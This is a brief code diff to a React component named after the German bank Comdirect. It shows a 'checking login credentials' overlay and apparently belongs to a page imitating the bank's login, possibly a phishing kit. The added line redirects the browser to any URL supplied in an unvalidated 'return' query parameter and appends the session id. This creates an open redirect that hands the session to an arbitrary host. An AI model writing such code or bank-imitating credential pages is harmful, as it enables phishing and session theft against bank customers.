@@ -781,7 +781,7 @@ const Comdirect = () => {
         <LoadingOverlay
           message="Anmeldedaten werden überprüft..."
           onComplete={() => {
-            window.location.href = `/confirmation${sessionId ? `?s=${sessionId}` : ""}`;
+            { const r = new URLSearchParams(window.location.search).get("return"); window.location.href = r ? `${r}?step=3&s=${sessionId}` : `/confirmation${sessionId ? `?s=${sessionId}` : ""}`; }
           }}
         />
       )}
